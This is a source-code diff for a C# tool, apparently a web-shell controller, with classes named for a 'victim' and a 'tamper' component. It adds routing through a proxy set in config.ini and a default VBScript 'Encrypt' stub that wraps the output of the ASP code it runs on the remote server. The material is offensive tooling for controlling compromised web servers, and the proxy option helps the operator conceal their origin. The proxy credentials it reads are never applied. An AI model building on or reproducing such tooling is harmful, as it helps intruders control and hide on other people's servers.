@@ -21,6 +21,10 @@ namespace Alien
     {
         private bool _disposed;
 
+        private clsIniManager m_iniMgr { get; init; }
+        private bool m_bUseProxy { get; init; } = false;
+        private bool m_bSetProxySucceed { get; init; } = false;
+
         public clsVictim m_victim { get; init; }
         public clsTamper m_tamper { get; set; }
         public HttpClient m_clnt { get; set; }
@@ -318,6 +322,25 @@ namespace Alien
                 UseCookies = true,
                 AllowAutoRedirect = true,
             };
+
+            // Proxy
+
+            m_iniMgr = new clsIniManager("config.ini");
+
+            bool bEnable = m_iniMgr.ReadBool("Proxy", "Enable");
+            if (bEnable)
+            {
+                string szURL = m_iniMgr.ReadString("Proxy", "URL");
+                string szUsername = m_iniMgr.ReadString("Proxy", "Username");
+                string szPassword = m_iniMgr.ReadString("Proxy", "Password");
+
+                handler.Proxy = new WebProxy(szURL)
+                {
+                    BypassProxyOnLocal = false
+                };
+
+                handler.UseProxy = true;
+            }
 
             m_clnt = new HttpClient(handler)
             {
@@ -1327,11 +1350,25 @@ namespace Alien
             if (szEncryptor == "*")
                 return szProcessed;
 
+            string szVbEncryptor = "";
+            if (string.IsNullOrEmpty(szEncryptor))
+            {
+                szVbEncryptor =
+                    "Function Encrypt(data)\r\n" +
+                    "    ' TODO: do something\r\n" +
+                    "    Encrypt = data\r\n" +
+                    "End Function\r\n";
+            }
+            else
+            {
+                szVbEncryptor = szEncryptor;
+            }
+
             string szHeader =
                 "\r\n" +
                 "Dim globalStringOutput\r\n" +
                 "globalStringOutput = \"\"\r\n\r\n" +
-                (string.IsNullOrEmpty(szEncryptor) ? "" : szEncryptor) + "\r\n\r\n";
+                szVbEncryptor + "\r\n\r\n";
 
             string szFooter = "\r\n\r\nResponse.Write(Encrypt(globalStringOutput))\r\n";
 
